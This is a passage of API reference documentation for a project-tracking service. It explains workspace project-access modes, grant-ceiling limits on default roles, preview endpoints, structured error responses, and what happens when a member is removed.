| `GET` | `/workspaces/{id}/project-access` | `workspace.edit` | The [project-access](#project-access) page in one request: mode, default project role, the roles you may set it to, and the current impact |
| `POST` | `/workspaces/{id}/project-access/preview` | `workspace.edit` | What a change *would* do. Same body as the `PATCH`; **persists nothing** |
| `POST` | `/workspaces/accept-invite?token=…` | ✔ | Accept an invite; must be signed in with the invited email |

```json
// POST /workspaces  {"name": "Acme Inc"}
{
  "id": "…", "slug": "acme-inc", "name": "Acme Inc",
  "projectAccessMode": "OPEN",                 // OPEN | STRICT — see Project access
  "defaultProjectRoleId": null,                // null = the built-in Contributor
  "myRole": "OWNER",
  "myPermissions": ["workspace.edit", "workspace.member.manage", "…"],
  "createdAt": "…"
}
```

Every workspace response — create, list, get and invite acceptance — carries [`myPermissions`](#permissions): the caller's effective **workspace-scoped** permissions. It is always present (an empty array is a real answer) and is the field to gate UI on; `myRole` is for display.

### Project access

A workspace decides one thing about the people who were never added to a project: **do they inherit that project's default role, or not?** That is `projectAccessMode`, and it is on every workspace response.

**There is deliberately no "enforcement off" mode, and this is not one.** Permissions always mean exactly what they say, in both modes. What the mode changes is a single link in how a member's effective project role is resolved:

> their explicit `project_members` row, if any → else the project's `defaultProjectRoleId` → else the workspace's `defaultProjectRoleId` → else the built-in **Contributor** — **and all of that only while the workspace is `OPEN`**. In `STRICT`, a member with no explicit row gets *nothing* from the chain.

| Mode | What it means |
|---|---|
| `OPEN` | Everyone in the workspace can work in every project, through each project's default role. You add somebody to a project only to give them a **different** role |
| `STRICT` | Only people added to a project can change anything in it. Everyone can still **see** every project |

**`OPEN` is the default** — for workspaces created after this release and for every workspace it upgrades — and behaviour under it is identical to the previous release. `STRICT` narrows **writes** only: no read is lost, and narrowing reads would be private projects by the back door, which this API does not have.

**Flipping changes no data.** No membership row is written, no issue is unassigned, no sprint, version or component is touched, and no issue's `version` moves. Flipping back restores every member's `myPermissions` byte for byte. That reversibility is the point, and it is why the switch does not ask you to type the workspace name.

**Two things that follow, and surprise people:**

- **A workspace `OWNER`/`ADMIN` is not a rescue.** Their workspace-wide grants over every project are `project.edit`, `component.manage`, `version.manage` and `sprint.manage` — no issue and no comment permission. So in a `STRICT` workspace, a project nobody has been added to cannot be worked in **by anyone, including the owner**: they can rename it and cut a version, and they cannot file an issue in it. The preview counts exactly this as `projectsWithNoWriters`.
- **The declared defaults survive `STRICT`.** Both `defaultProjectRoleId` columns keep their values while the mode is on — they are inert, not erased, and go live again the instant the workspace is switched back. That is why the grant ceiling below applies in **both** modes: a bound that only bit while `OPEN` would be one you step over by flipping twice.

#### Changing it — `PATCH /workspaces/{id}`

Needs [`workspace.edit`](#permissions). Every field is optional and each is an independent decision, so a body naming only `name` does not disturb the mode and one naming only the mode does not disturb the name:

```json
// PATCH /workspaces/{workspaceId}
{
  "name": "Acme Inc",                          // optional, trimmed, 1–255 chars
  "projectAccessMode": "STRICT",               // optional, OPEN | STRICT
  "defaultProjectRoleId": "0198c4a1-…",        // optional, a PROJECT-scoped role of this workspace
  "clearDefaultProjectRole": true              // optional — store null, i.e. the built-in Contributor
}
```

A body naming **none** of them is a `400` rather than a silent `200`: *"I asked for nothing and something might have happened"* is not an answer. Sending `defaultProjectRoleId` **and** `clearDefaultProjectRole` is a `422` — they mean different things, and resolving them by precedence would store a value you did not ask for in the one part of the product where that is a privilege change.

**A request whose values already hold is a `200` that writes nothing** — the row is not touched, so `updatedAt` does not move. Re-sending a form's current state is safe.

#### The default-role pickers are ceiling-bounded — and the two scopes bound differently

A default role is handed to nearly every member of the workspace, so neither picker will let you grant, through it, a permission you do not hold yourself. Both are checked on **both ends** — the role you are setting *and* the one you are replacing — because "whatever you may not grant, you may not strip" is the same rule that governs a membership change. The refusal is a `403` that **names the offending permission**, and it is the first uncovered one in catalog order.

The comparand is where they part company, and an integrator needs to know it:

| Picker | Gate | Measured against | Exempt |
|---|---|---|---|
| `PATCH /workspaces/{id}` → `defaultProjectRoleId` | `workspace.edit` | a **fixed baseline**: the built-in **Contributor**'s permissions, plus whatever your *workspace* role grants you in every project | the built-in workspace `OWNER`, in their own workspace |
| `PATCH …/projects/{pId}/default-role` | `project.member.manage` | **your own real effective permissions in that project** | nobody |

So **a value accepted at one scope may be refused at the other**, in both directions. A workspace `ADMIN` may set the workspace default to Viewer, Commenter, Contributor or any custom role inside Contributor's set, and is refused (`403`) for Team lead, Project admin, or anything carrying `project.member.manage`, `project.archive`, `project.taxonomy.manage`, `issue.delete` or unrestricted `attachment.delete` — the fixed baseline is stable, does not move when the default moves, and keeps the shipped value settable. Meanwhile a project administrator holding all twenty project permissions may set *any* of them as that project's default, while a narrow custom role that holds `project.member.manage` and little else may not — and may not narrow a default of Project admin either.

**The membership escape does not reach either picker.** A holder of `project.member.manage` may hand the built-in project `MANAGER` role to *another member* regardless of the ceiling ([one escape, and only one](#projects)). That escape rests entirely on the target not being the actor; a default has no target — or rather its target is everyone, you included. So the same caller who may promote a colleague to Project admin gets a `403` naming `issue.delete` when they aim that role at a default.

#### `settable` — the ceiling, rendered

Both read endpoints (`GET …/project-access` and `GET …/projects/{pId}/default-role`) return a `settable` block so an administrator sees the bound **while choosing** rather than as a `403` afterwards:

```json
"settable": {
  "canSet":    [ { "roleId": "0198c4a1-…", "name": "Viewer" } ],
  "cannotSet": [ { "roleId": "0198c4a2-…", "name": "Project admin", "missing": "project.archive" } ]
}
```

It covers the `PROJECT`-scoped roles of this workspace — exactly the set [`GET /workspaces/{id}/roles`](#custom-roles) already lists, so it names nothing you could not already see — partitioned by the comparand for **that** endpoint's scope. `missing` is the **first** permission you lack for that role, and it is the identical string the runtime `403` quotes, so a greyed-out tooltip and the refusal say the same word.

**It is server-derived guidance, not enforcement.** Do not treat `canSet` as a promise or `cannotSet` as the authority: the write re-checks the ceiling in its own transaction, so a role listed in `canSet` can still be refused if your permissions changed in between, and your client must handle the `403` either way. Equally, do not re-derive this list yourself — the own-only/unrestricted asymmetry between permission keys is subtle, and a second implementation of a server predicate drifts from it.

#### The preview is advisory; the refusals are not

`POST /workspaces/{id}/project-access/preview` takes **the same body as the `PATCH`**, runs the same checks, and **persists nothing** (`POST` because it carries a body). It answers what the change would do:

```json
{
  "computedAt": "2026-08-18T09:14:00Z",
  "from": { "mode": "OPEN",   "defaultProjectRoleId": null },
  "to":   { "mode": "STRICT", "defaultProjectRoleId": null },
  "activeMembers": 24,
  "projects": 5,
  "projectsWithNoExplicitMembers": 3,
  "projectsWithNoWriters": 3,
  "perProject": [
    { "id": "0198c4a1-…", "key": "PAY", "name": "Payments",
      "membersOnDefault": 21, "explicitMembers": 3,
      "membersLosingEverything": 21, "noWritersAfter": false }
  ],
  "strandedProjects": [ { "id": "0198c4a2-…", "key": "OPS", "name": "Ops" } ]
}
```

| Field | What it counts |
|---|---|
| `activeMembers` | ACTIVE members of the workspace. Deactivated accounts are excluded everywhere here — an account that cannot log in is not a person who loses access |
| `projects` | Live (non-archived) projects |
| `projectsWithNoExplicitMembers` | How many of those nobody has ever been added to |
| `projectsWithNoWriters` | Live projects where, after the change, **nobody at all** holds `issue.create` — including the workspace owner (see above). A warning, not a refusal: a workspace may legitimately restrict a project nobody is working in |
| `perProject[].membersOnDefault` | ACTIVE members with **no** explicit row in that project — the people the mode is about |
| `perProject[].explicitMembers` | ACTIVE members who do have a row there, and are therefore unaffected |
| `perProject[].membersLosingEverything` | Of those on the default, the ones whose workspace role grants neither `project.curate.all` nor `project.administer.all` — who would hold the empty set there afterwards |
| `strandedProjects` | The projects the write will **`409`** on. Empty is the normal answer |

**Now the part to code against.** Every number here except `strandedProjects` describes a *population* — active workspace members crossed with explicit project memberships — and that population is **not the row being written**. People join, leave and get added to projects between your preview and your `PATCH`, so the counts can go stale and no optimistic check on the workspace could ever make them exact. That is why the response carries `computedAt` and why there is deliberately **no token, no echo and no `expectedCount`**: inventing one would be ceremony that merely looks like a guarantee. Re-fetch the preview immediately before you act on it, and treat the numbers as a decision aid. **An integrator who treats the counts as a contract will be wrong.**

`strandedProjects` is the exception, and the reason the distinction matters: it is **re-derived inside the write's own transaction** and enforced there whether or not anyone ever previewed. A client that skips this endpoint entirely gets the same `409`. Preview and write share one implementation, so for the same body the list here is the list the `PATCH` would refuse with. **Counts are advisory; refusals are authoritative.**

A grant-ceiling failure surfaces from the preview as the ordinary **`403`**, never as a "would fail" field inside a `200` — a preview that succeeds while describing a refusal teaches a client to ignore it. **Both** shapes of that `403` reach it, the structured one below included, and for the same body it is the same answer the `PATCH` would give. There is no `409` on the preview: the stranding is a *field*, because that is the question being asked.

#### `REACTIVATED_DEFAULT_ABOVE_CEILING` — a `403` that names projects

**Flipping `STRICT` → `OPEN` is a grant, even when the body names no role.** Every declared default in the workspace stops being inert at that moment: the workspace default becomes the effective role of every member with no explicit `project_members` row, and each project that declares its own default overrides it there. So the ceiling above applies to a body that is nothing but `{"projectAccessMode": "OPEN"}` — without that, a caller refused `{"defaultProjectRoleId": "<Project admin>"}` would get the identical outcome from a one-field flip that names no role at all. It is bounded in that direction only (taking inheritance away grants nothing), the built-in workspace `OWNER` is exempt here as everywhere, and both `PATCH /workspaces/{id}` and `POST …/project-access/preview` answer it — the preview runs the same check and still persists nothing.

When the role that comes back to life is a **per-project** declared default, the refusal carries a body of its own:

```json
{
  "type": "about:blank",
  "title": "Forbidden",
  "status": 403,
  "detail": "Restoring open project access would make “Project admin” the default in Payments (PAY), Ops (OPS), and it includes issue.delete — a permission you do not hold in this workspace. Narrow that role if it is one you can edit, ask an administrator of each of those projects to clear its default, or ask a workspace Owner to make this change.",
  "errorType": "REACTIVATED_DEFAULT_ABOVE_CEILING",
  "role": "Project admin",
  "missing": "issue.delete",
  "projects": [
    { "id": "0198c4a1-…", "key": "PAY", "name": "Payments" },
    { "id": "0198c4a2-…", "key": "OPS", "name": "Ops" }
  ]
}
```

**Why this one names projects when the ordinary ceiling `403` does not.** The generic refusal names a role and a permission, which is enough when the reader is looking at the picker that offered the role. Here they are looking at a switch on the workspace's General page, and the obstacle is a column on *another screen*, in one of possibly hundreds of projects — a body naming only the role would leave them opening project settings one at a time to find it. So `projects` is the machine-readable half and is **uncapped** (in no guaranteed order — sort it yourself if you render a list), while `detail` names at most three and summarises the rest as `and N more`. `role` and `missing` are the same pair [`settable`](#settable--the-ceiling-rendered) greys a role out with — the same comparison over the same comparand — so the tooltip and the refusal say the same word. Naming these projects discloses nothing: the caller holds `workspace.edit` and can already list every project of the workspace. Archived projects are excluded, because nothing is inherited in them.

**The remedy is deliberately three-part, because which parts exist is not something the server can see.**

1. **Narrow the role** — only if it is a custom role you may edit. A built-in cannot be narrowed at all, and the API will refuse.
2. **Ask an administrator of each named project to clear its default** — they hold `project.member.manage` there by definition. *You* almost certainly cannot: clearing a project's override needs that permission **in that project**, and it sits deliberately outside the workspace-wide curator set, so no workspace role grants it — not even an `OWNER` without a membership row there.
3. **Ask a workspace `OWNER` to make the change** — they are exempt from this ceiling everywhere.

The third always exists, which is what makes this a guard rather than a lock-out. Render `detail` rather than composing the sentence yourself: it is the one place all three are stated together, and nothing in the response tells you which of the first two is actually open to you.

**The same endpoints answer `403` in two shapes, so do not assume `errorType` is present.** When the role that goes live is the **workspace** default rather than one project's own, the refusal stays the ordinary [grant ceiling](#the-grant-ceiling) `403`: the plain sentence, **no** `errorType` and **no** `projects` — there is no project to name, and the remedy is the workspace-default one. Read an absent `errorType` here as "this is the plain refusal", never as an unrecognised value; it is the same rule the [lock-contention `409`](#errors) already establishes.

**Ordering, and what it does not interact with.** The workspace default is bounded **first**, so a flip blocked by both answers the plain ceiling `403` and the structured one appears only on the retry. A second offending *role* likewise surfaces as its own refusal on the next attempt: one body reports one role together with exactly the projects that declare it, never a judgement about one role illustrated with another's projects. And because this is a `403`, the "check `Retry-After` first" rule below does not reach it — that rule sorts `409`s, this status is never retryable, and no variant of it carries the header.

Nothing is written when it fires, in either shape: the mode stays `STRICT`, and neither the name nor any default moves. A project whose stored default id cannot be resolved is skipped rather than refused — what it falls back to is the built-in Contributor, which is inside the baseline by construction, so there is nothing left to bound.

#### `STRANDED_BY_INHERITANCE` — a `409` you cannot retry your way out of

A project can be administered with **no membership row at all**: while the workspace is `OPEN`, a default role that grants `project.member.manage` makes every member without an explicit row an administrator of it. Any change that removes that inheritance — flipping to `STRICT`, moving the workspace default to a role that does not manage members, or doing the same to one project's own default — would leave such a project with nobody able to manage its membership, and no endpoint can repair that state. So the write is refused:

```json
{
  "type": "about:blank",
  "title": "Conflict",
  "status": 409,
  "detail": "Restricting project access would leave a project with nobody able to manage their membership: Ops (OPS). Add an explicit administrator to each first — the current default still lets you.",
  "errorType": "STRANDED_BY_INHERITANCE",
  "projects": [ { "id": "0198c4a2-…", "key": "OPS", "name": "Ops" } ]
}
```

It is the familiar [stranded-projects shape](#errors): same status, same **uncapped** `projects` array ordered by `key`, same three-name cap on `detail`. Read `projects` and `errorType`; never parse `detail`. Nothing at all is written when it fires — not the mode, not the default, not the name.

**No retry flag applies, and none is offered.** `adoptStrandedProjects=true` (the workspace-removal retry) writes the caller a Team lead row; here the caller holds *no* row and inherits a default that is at least as wide as `project.member.manage` and may be much wider, and an explicit row always beats the default — so "adopting" would **narrow the person doing the rescuing** in the very project they were rescuing. The remedy in `detail` is instead one you can perform right now: give each named project an explicit administrator, which the default that is about to stop mattering still lets you do, or pick a default that also manages members.

**The same `409` also reaches an existing endpoint.** [`DELETE /workspaces/{id}/members/{userId}`](#managing-members) now refuses with it when the departing member was the last person standing on such a default — a hole that was previously silent, because that guard only ever looked at explicit `project_members` rows. It is checked **after** that endpoint's other stranded-project refusals, so a removal that strands projects both ways reports the explicit-row one first.

**Check `Retry-After` first, as always.** A `409` carrying that header is [lock contention](#errors) — retryable unchanged, and deliberately carrying no `errorType`. Only once you have ruled the header out do you branch on `errorType`, and an unrecognised value means "no recovery I know about".

None of this fires in the shipped configuration: no built-in role that anybody would choose as a default grants `project.member.manage`, so until somebody uses these pickers the whole family is unreachable.

#### Status codes

| Status | When |
|---|---|
| `200` | `PATCH`: the updated workspace, or the unchanged one when every requested value already held. `GET`/`POST`: the state or the impact |
| `400` | The `PATCH`/preview body names none of the four fields; `name` fails validation; or `projectAccessMode` is not `OPEN`/`STRICT` (an unknown value fails at the JSON boundary — there is no third mode) |
| `403` | Missing `workspace.edit` (or `project.member.manage` for the project-level picker), **or** a grant-ceiling refusal naming the permission you lack — on a `STRICT` → `OPEN` flip that is either the [structured body](#reactivated_default_above_ceiling--a-403-that-names-projects) naming the projects whose own default is in the way (`errorType: "REACTIVATED_DEFAULT_ABOVE_CEILING"`) or, when the workspace default is the obstacle, the plain sentence with no `errorType` at all |
| `404` | Unknown workspace, or you are not a member — indistinguishably, as everywhere |
| `409` | `errorType: "STRANDED_BY_INHERITANCE"` (write endpoints only), or [lock contention](#errors) with `Retry-After` |
| `422` | A role id that is unknown, belongs to another workspace, or is `WORKSPACE`-scoped — scope is not negotiable here, because a workspace role accepted as a project default would put `workspace.edit` into every member's context in every project; or a body naming the default in both accepted ways at once |

### Managing members

All three endpoints require [`workspace.member.manage`](#permissions) — held by the built-in `OWNER` and `ADMIN` and not by `MEMBER`, which is exactly who could use them before. There is no role *ladder* behind them any more (see [Roles](#roles)); what bounds an edit is the grant ceiling below.

`PATCH …/members/{userId}` takes `{"roleId": "…"}` — the id of any assignable role, which is the only way to name one of the workspace's [custom roles](#custom-roles) — or the deprecated `{"role": "OWNER" | "ADMIN" | "MEMBER"}`. [Exactly one of the two is required](#naming-a-role-roleid-and-the-deprecated-role-key): neither and both are alike a `422`, as is a role reference that cannot be assigned here. It returns the updated membership in the same shape `GET …/members` lists:

```json
{ "userId": "…", "email": "mia@example.com", "displayName": "Mia", "avatarUrl": null,
  "roleId": "0198c4a1-…", "role": "ADMIN", "joinedAt": "…" }
```

Setting the role a member already holds is an accepted no-op rather than an error, so re-sending the current value from a form is safe.

**The grant ceiling.** Nobody may hand out — or act on a member holding — a role that grants a permission they do not hold themselves, and the check covers the target's **current** role as well as the new one. It is a comparison of *permission sets*, not of role names: there is no ordering on roles to compare. An own-only grant never satisfies an unrestricted one, so a `label.manage:own` holder can never mint a role with the unrestricted key. The refusal is a `403` that names the offending permission.

On top of that sits one rule a permission comparison cannot express: **only an `OWNER` may hand out the `OWNER` role, or administer a member who holds it.** `OWNER` and `ADMIN` are deliberately given identical permissions — ownership is a guardrail on assignment, not a bigger role — so without this an `ADMIN` could promote themselves or demote the real owner. An `ADMIN` therefore manages `MEMBER`s and other `ADMIN`s but can neither promote anyone to `OWNER` nor demote or remove an existing one (`403 "Only an Owner can assign the Owner role or administer another Owner"`), while an `OWNER` **may** promote another member to `OWNER` — that is how ownership is handed over. This differs on purpose from `POST …/invites`, which refuses `OWNER` outright *even for an owner*: you promote a colleague to owner, you do not invite a stranger as one. It looks like an inconsistency and is not one.

For the built-in roles all of this behaves exactly as the old "never above your own role" rule did; only the wording of the `403` has changed, and it is now specific enough to act on.

**The last owner is protected.** A workspace must never end up without an `OWNER`, so demoting or removing the final one returns `409` — whoever asks, including that owner acting on themselves. Promote a second owner first. (Because an unchanged role is a no-op, re-sending `OWNER` for the last owner is still fine.) The check is serialised, so two admins demoting two different owners at the same moment cannot both succeed; the second gets the `409`.

**A workspace demotion does not touch project roles.** The two scopes are separate: someone demoted from `ADMIN` to `MEMBER` keeps every explicit project membership they hold, project `MANAGER` rows included, and keeps whatever those grant inside those projects. That is deliberate scope separation, not an oversight — but it is probably not what "demote" suggests, so if you are reducing someone's access in a hurry, check `GET …/projects/{projectId}/members` as well. Removal, by contrast, *does* delete their project memberships in this workspace.

**Removal is not account deletion.** A user account is global and may belong to several workspaces, so `DELETE …/members/{userId}` revokes access to **this** workspace only. In one transaction it:

- deletes the workspace membership;
- deletes that user's project memberships **within this workspace** (leaving them behind would silently restore a project role if the person were ever re-invited);
- clears the `assignee` of their issues **in this workspace**, writing one `assignee` history entry per issue so the unassignment shows up in the activity feed like any other edit;
- deletes every **unaccepted invite** for their address in this workspace. Duplicate pending invites are normal (a re-send), and they stay hidden while the person is a member — so without this, removing them would make a leftover invite *reappear* on their "join a team" screen, and one click would put them straight back. Accepted invites are kept as the record of how they originally joined;
- closes any **live event stream** (SSE) they hold on this workspace. Membership is only checked when a stream is opened, so an open one would otherwise keep delivering activity metadata until it timed out. Their browser reconnects, that reconnect re-checks membership, and it gets the `404`.

**A removal that would leave a project without an administrator is refused (`409`).** Because the removal deletes that person's project memberships, offboarding the only member who can manage a project's membership would leave that project with nobody able to. So the endpoint refuses instead, and **nothing at all happens** — not the workspace membership, not the project rows, not an unassignment. "Administrator" here means *a member holding [`project.member.manage`](#permissions) in that project*: the built-in project `MANAGER` and `TEAM_LEAD` are its built-in holders, but the check is on the **permission**, so any role granting it counts and any role that does not, does not. A workspace `OWNER`/`ADMIN` holding no membership row in the project is **not** one of its administrators — that permission sits outside the workspace-wide curator set — and a project that already has no administrator is not affected either: what is refused is only the transition from one to none.

The body names **every** affected project in the uncapped `projects` array (id, `key`, `name`, ordered by `key`) while `detail` is a sentence capped at three names — see [Errors](#errors) for the shape, and read `projects` rather than parsing `detail`.

**Two kinds of project no longer count**, and both narrowings mean fewer removals are refused:

- an **archived** project is frozen, so there is nothing left to administer in it and it never blocks an offboarding — including one a year later;
- only **active accounts** count as administrators. A project whose sole administrator has been deactivated is treated as already having none, so disabling an account (the ordinary revocation step) never leaves a permanent `409` behind, and a disabled administrator never masks a project that is in truth unmanaged.

**Resolving it: repeat the request with `?adoptStrandedProjects=true`.** That two-step flow is the intended path, not an escape hatch — the first call answers `409` listing the projects, a human reviews the list, and the second call carries the flag. In the same transaction as the removal, the **caller** is granted the built-in project role [`TEAM_LEAD`](#roles) ("Team lead" — a contributor's everyday rights plus `project.member.manage`) in each project that would otherwise be stranded, and the removal then proceeds. It is a **query parameter** (`DELETE` here takes no body), it defaults to `false`, and it is accepted on a *first* attempt as well — you never have to collect the `409` first.

**An adoption changes the success status: `200` with a body, not `204`.** A removal that grants nothing answers `204 No Content` exactly as before — that covers every ordinary removal *and* a flagged one that turned out to strand nothing. Only a removal that actually granted the caller a role answers `200`, and the body names what was granted:

```json
{
  "adoptedProjects": [
    { "id": "0198c4a1-…", "key": "P17", "name": "Alpha" },
    { "id": "0198c4a2-…", "key": "P42", "name": "Bravo" }
  ]
}
```

`adoptedProjects` is every project taken over, ordered by `key`, in the same `{id, key, name}` shape as the `409`'s `projects`. The status differs on purpose: because the flag is accepted without a prior `409`, a client that wires it on once — or a script that retries on any conflict — could otherwise accumulate project roles for its user with nothing on the wire ever saying so, the grant being visible only in a server log the actor cannot read. So **branch on the status** rather than assuming `204`, and show the user what they were given.

**Be precise about the size of that grant.** It is *not* the project `MANAGER` role, which is what an earlier build handed out: an adopter gets no `issue.delete`, no unrestricted `attachment.delete`, and none of `project.archive`, `project.edit`, `project.taxonomy.manage`, `sprint.manage`, `version.manage` or `component.manage` — control of the roster, never of the work. It is also not `project.member.manage` alone, which would be *narrower* than what an ordinary member of that project already holds, and would therefore demote the adopter into a state they could not undo. But it is not literally "the right to appoint an administrator, and nothing else" either: measured against what an ordinary member can already do there the delta is exactly `project.member.manage`, while a caller who held a **narrower explicit role** in an adopted project (a `COMMENTER` row, say) has that row replaced and gains the contributor rights along with it. Either way it is a durable takeover of somebody else's project — resolve the `409` deliberately, not reflexively.

That retry exists because the other remedy is not available to the person being refused: giving a listed project another administrator through `POST …/projects/{projectId}/members` needs `project.member.manage` **in that project**, which no workspace-scoped role grants — a workspace `OWNER` who is not a member there gets a `403`. Without the flag the only way out of the `409` would be a database edit. Note the deliberate consequence: the [grant ceiling](#managing-members) is **not** applied to the adoption. It could not be — in a project they never joined, a workspace `OWNER` holds only the four workspace-wide curator permissions, and `project.member.manage` is not among them, so a ceiling check would refuse every adoption and leave the refusal unsatisfiable again. What bounds the adoption instead is that it only ever reaches a project this very request is about to strand, that the caller has already passed the grant ceiling against the departing member's workspace role, and that it is explicit and server-logged per project.

**The flag is consent, not an instruction, and a client never names a project.** The set adopted is recomputed on the server inside the transaction, so it is exactly what is about to be stranded *now* — never the array the earlier `409` returned. A project that gained another administrator between the two calls is silently dropped; a flagged removal that strands nothing grants nothing at all (setting the flag on every request does not accumulate project rights); and no project the client merely fancies can be added to the set. Show the user the `409`'s `projects`, but do not assume it is what you will get.

Read `adoptedProjects` for what was actually taken over rather than re-deriving it (`myRole`/`myPermissions` on `GET …/projects` reflect it too, immediately). Where the caller already held a membership row in an adopted project that row is **promoted in place** — its role is replaced, not added alongside.

**The adoption itself can be refused, with the same `409` — and this one deliberately offers no retry.** If the caller already holds a role in one of the stranded projects that grants something `TEAM_LEAD` does not, replacing that row would *demote* the very person doing the rescuing, and the [grant ceiling](#managing-members) would then refuse to give the missing rights back, since the departing member was the last holder of them. Skipping the project instead would strand it. So the whole removal is refused and nothing is written — not the adoption, not the unassignment, not the removal. The body is the familiar shape (`409`, a `projects` array), but it lists only the projects that block the adoption, and its `detail` names the obstacle instead of the retry, which would fail identically. This is unreachable with the built-in project roles — each is either covered by `TEAM_LEAD` or already holds `project.member.manage`, in which case the project was never stranded — so it takes a custom project role (a "QA lead" with `issue.delete` and no member management) to see it. **The remedy is somebody else's action, not yours:** ask the member you are removing — still active, still that project's administrator — to appoint a successor while they still can, or have another workspace administrator who does **not** already work in that project run the removal instead. Not one who already administers it: this branch is only reachable when the departing member is that project's single administrator, so that set is exactly the one just proven empty. Appointing one yourself is not open to you here: `POST …/projects/{projectId}/members` needs `project.member.manage` **in that project**, and this branch is only reachable because you do not have it.

Tell this one apart by `errorType: "ADOPTION_BLOCKED"` (the ordinary refusal is `"STRANDED_PROJECTS"`) and **do not render an adopt button for it** — the flag is already set, and setting it again produces this same `409`.

**A second, rarer stop on the same path — `errorType: "ADOPTION_ROLE_UNREADABLE"`.** The adoption also refuses when *your own* membership row in one of those projects refers to a role that cannot be resolved — a mis-scoped, foreign or hand-edited `role_id` — because overwriting a row the server cannot read is precisely what a rescue must not do. Nothing about your permissions is wrong, and the wording claims only what was tested: it names no cause (the code cannot tell which of those it is) and offers you no action, because you have none. **Neither you nor the member you are removing can clear it** — retrying fails the same way — so it takes a system administrator repairing that row; the server has already logged an ERROR and counted the fault. If one project blocks the adoption *and* another carries an unreadable row, the unreadable one is reported first, deliberately: leading with the other would send you to arrange a handover that then runs into this one anyway.

**A third stranded-project refusal, and this one is about administrators who hold no row at all — `errorType: "STRANDED_BY_INHERITANCE"`.** While the workspace is [`OPEN`](#project-access), a default role that grants `project.member.manage` makes every member *without* an explicit row an administrator of that project. The guard above never saw them: it builds its candidate list from `project_members` rows, so removing the last member who was administering a project purely by inheritance used to leave it unmanageable with no `409`, no adoption and no log line. It is refused now, with the same body and the same uncapped `projects` array. **`adoptStrandedProjects=true` does not clear it and must not be offered:** adoption writes you a `TEAM_LEAD` row, and here you hold *no* row and inherit a default at least as wide — so taking the project over would **narrow** you in the very project you were rescuing. The way out is in `detail` and you can take it right now: give each named project an explicit administrator, which the default that is about to stop mattering still lets you do, or ask the member you are removing to do it while they still can. It is checked **after** the two refusals above, so a removal that strands projects both ways reports the explicit-row one first — and it cannot fire at all while the workspace default grants no member management, which is the shipped configuration.

Why the state is worth refusing a removal over in the first place: `project.member.manage` is **not** part of the workspace-wide curator set, so a workspace `OWNER`/`ADMIN` who holds no membership row in that project cannot add members back, archive it, or manage its project-private taxonomy — and no endpoint restores it, which is why the alternative (letting the removal proceed and silently orphaning those projects) was rejected. That is a property of the roles this release ships rather than a permanent one: the permission model also has a **project-default** route to `project.member.manage`, and this release ships the picker that opens it ([Project access](#project-access)) — which is exactly why the inherited-administrator refusal above had to exist. The guard behaves the same either way.

The unassignment bumps each affected issue's `version`, so a client that loaded one of those issues **before** the removal and then saves an edit gets the usual `409` — asking it to refresh and retry — instead of silently writing the old assignee back. That holds whether the client sent `version` (rejected by the issue endpoint's own check) or omitted it and simply lost the race (rejected by the database's).

The account itself is untouched, as is their membership of every other workspace — including issues assigned to them there.

**What deliberately survives**, and is not a dangling reference:

| Kept | Why |
|---|---|
| Historical attribution — issue `reporter`, comment author, [history](#issues) entries, [attachment](#attachments) uploader | Who did a thing does not change because they left |
| [Saved filters](#saved-filters) they own, shared ones included | A shared filter resolves in the **viewer's** context, so it keeps working for everyone else |
| Any [component](#components) they lead (`lead`, and its `autoAssign` flag) | A departed lead keeps the row so the module still records who led it; auto-assign re-checks membership at issue-create time and silently skips them, leaving the new issue unassigned |

**Status codes** for both verbs:

| Status | When |
|---|---|
| `200` | `PATCH`: the updated membership. `DELETE`: the member was removed **and** at least one project was adopted — the body is `{"adoptedProjects": […]}` |
| `204` | `DELETE` only — the member was removed and nothing was granted (every removal without the flag, and a flagged one that stranded nothing) |
| `400` | Malformed JSON, or a field that fails ordinary validation (a `role` string over 40 characters). **Not** an unnamed role — see the `422` row |
| `403` | The caller lacks `workspace.member.manage`, the change breaks the grant ceiling, or it involves the `OWNER` role and the caller is not an owner |
| `404` | Unknown workspace, caller not a member, **or** the target holds no membership in *this* workspace |
| `409` | The change would leave the workspace without an `OWNER` (no `errorType`); on `DELETE` only, would leave one or more projects without an administrator (`errorType: "STRANDED_PROJECTS"`), **or** the adoption those projects need would demote the caller (`errorType: "ADOPTION_BLOCKED"`) or stopped on a membership row whose stored role cannot be read (`errorType: "ADOPTION_ROLE_UNREADABLE"`), **or** would take the last administrator a project had only through its default role (`errorType: "STRANDED_BY_INHERITANCE"`, no retry) — all of those bodies also carry `projects`; or a lost row-lock race (no `errorType`, but a `Retry-After` header — just retry) |
| `422` | `PATCH`: the role cannot be assigned here ([`"Unknown role"`](#unknown-role--a-422)), or the body named it with [neither or both](#naming-a-role-roleid-and-the-deprecated-role-key) of `roleId` / `role`. `DELETE`: the target is the caller (see below) |

The two *invariant* `409`s cannot both be reported, and the last-owner one wins: a sole owner who is also the sole administrator of a project is told to promote another owner first, and sees the project list only once that is done. The self-removal `422` also precedes the project check. A further `409` — [lock contention](#errors) — is not an invariant at all and can arrive on any attempt.

**Tell them apart by the response, never by the wording of `detail`, and in this order:**

1. **`Retry-After` present** → lock contention. Retry the *identical* request unchanged after that many seconds. (No `errorType`, deliberately — this is why the header is checked first.)
2. **`errorType: "STRANDED_PROJECTS"`** → the removal would strand the listed `projects`. Offer the `adoptStrandedProjects=true` retry.
3. **`errorType: "ADOPTION_BLOCKED"`** → that retry was made and cannot work. Render `detail`; offer no retry. (Treat an unrecognised `errorType` as this case.)
4. **`errorType: "ADOPTION_ROLE_UNREADABLE"`** → the adoption stopped on a membership row whose stored role cannot be read. Render `detail`; offer no retry, and no self-service remedy either — it needs an operator.
5. **`errorType: "STRANDED_BY_INHERITANCE"`** → the removal would take the last administrator of projects that were administered only through a default role. Render `detail`; **offer no retry** — the adopt flag would narrow the adopter. Give each named project an explicit administrator instead.
6. **Neither** → the last-owner invariant. Promote another owner first.

Cases 2 to 5 are mutually exclusive: case 2 depends on the flag, when 3 and 4 both apply the server reports 4 (the one nobody present can clear), and case 5 is checked after all of them, so a removal that strands projects both ways reports the explicit-row case first. All four carry `projects`, so a client that only lists the projects in the way can still treat them as one case; only a client that offers a retry has to distinguish them.

That third `404` case is about the **membership**, never about the account: an unknown id, an id belonging to someone in another workspace, and a member who was removed a second ago are one indistinguishable answer, so the endpoint cannot be used to probe which accounts exist. It also makes a repeated `DELETE` a clean `404` instead of an error — safe to retry.

